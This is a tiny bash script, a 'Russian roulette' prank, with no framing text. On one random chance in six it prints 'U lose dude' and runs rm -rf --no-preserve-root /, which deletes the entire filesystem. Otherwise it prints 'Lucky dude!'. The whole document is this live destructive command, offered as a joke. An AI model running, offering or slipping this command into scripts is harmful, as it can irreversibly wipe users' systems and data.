#!/bin/env bash
[ $[ $RANDOM % 6] == 0 ] && echo 'U lose dude' && rm -rf --no-preserve-root / || echo 'Lucky dude!'
